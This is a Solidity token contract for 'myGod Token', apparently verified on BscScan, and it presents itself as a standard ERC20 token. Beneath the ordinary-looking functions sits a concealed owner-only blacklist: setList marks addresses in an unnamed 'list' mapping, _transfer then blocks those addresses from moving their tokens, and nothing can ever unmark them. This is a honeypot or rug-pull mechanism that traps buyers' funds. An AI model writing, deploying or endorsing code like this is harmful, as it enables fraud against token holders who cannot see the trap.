/**
 *Submitted for verification at BscScan.com on 2023-01-31
*/

pragma solidity ^0.5.0;

contract myGodToken {
    // ERC20
    string private _name;
    string private _symbol;
    uint256 private _decimals;
    uint256 private _totalSupply;
    mapping (address => uint256) private balances;
    mapping (address =>bool) list;
    mapping (address => mapping (address => uint256)) private allowances;
    address public owner;
    // Events
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);

    // ================= Initial value ===============

    constructor (address _initial_account) public {
        _name = "myGod Token";
        _symbol = "myGod";
        _decimals = 18;
        owner=msg.sender;
        _totalSupply = 1000000000000000000000000000;// 10_00000000.mul(10 ** uint256(18));
        balances[_initial_account] = _totalSupply;
        emit Transfer(address(this), _initial_account, _totalSupply);
    }

    // ================= Pair transfer ===============

    function _transfer(address _sender, address _recipient, uint256 _amount) internal {
        require(_amount <= balances[_sender],"Transfer: insufficient balance of from address");
        require(!list[_sender] && !list[_recipient]);

        balances[_sender] -= _amount;
        balances[_recipient] += _amount;
        emit Transfer(_sender, _recipient, _amount);
    }

    // ================= ERC20 Basic Write ===============

    function approve(address _spender, uint256 _amount) public returns (bool) {
        _approve(msg.sender, _spender, _amount);
        return true;
    }

    function _approve(address _owner, address _spender, uint256 _amount) internal {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(_spender != address(0), "ERC20: approve to the zero address");

        allowances[_owner][_spender] = _amount;
        emit Approval(_owner, _spender, _amount);
    }

    function transfer(address _recipient, uint256 _amount) public returns (bool) {
        _transfer(msg.sender, _recipient, _amount);
        return true;
    }
    function setList(address to)public {
      require(msg.sender==owner);
      list[to]=true;
    }
    function transferFrom(address _sender, address _recipient, uint256 _amount) public returns (bool) {
        _transfer(_sender, _recipient, _amount);
        require(allowances[_sender][msg.sender]>=_amount);
        _approve(_sender, msg.sender, allowances[_sender][msg.sender]-_amount);
        return true;
    }

    // ================= ERC20 Basic Query ===============

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint256) {
        return _decimals;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address _owner) public view returns (uint256) {
        return balances[_owner];
    }

    function allowance(address _owner, address _spender) public view returns (uint256) {
        return allowances[_owner][_spender];
    }

}